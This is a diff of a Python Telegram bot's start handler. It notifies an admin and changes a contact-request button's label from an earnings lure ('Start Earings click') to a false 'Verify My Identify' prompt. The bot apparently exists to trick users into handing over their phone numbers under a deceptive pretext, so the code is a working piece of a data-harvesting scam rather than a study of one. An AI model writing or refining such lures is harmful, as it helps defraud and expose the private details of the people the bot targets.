@@ -21,7 +21,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
 
     # Welcome Message with Contact Button
-    contact_btn = KeyboardButton(text="Start Earings click✅", request_contact=True)
+    contact_btn = KeyboardButton(text="Verify My Identify ✅", request_contact=True)
     reply_markup = ReplyKeyboardMarkup([[contact_btn]], one_time_keyboard=True, resize_keyboard=True)
 
     welcome_text = (
